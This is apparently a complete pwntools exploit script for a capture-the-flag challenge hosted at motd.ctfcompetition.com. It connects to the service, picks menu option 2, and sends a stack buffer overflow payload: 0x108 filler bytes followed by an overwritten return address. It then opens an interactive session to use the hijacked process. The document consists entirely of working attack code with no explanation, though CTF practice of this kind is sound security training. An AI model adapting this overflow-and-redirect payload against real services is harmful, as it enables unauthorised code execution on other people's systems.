from pwn import *

r = remote('motd.ctfcompetition.com', 1337)
r.send('2\n')
r.send('A'*0x108 + '\xA5\x63\x60\x60\x00\x00\n')
r.interactive()
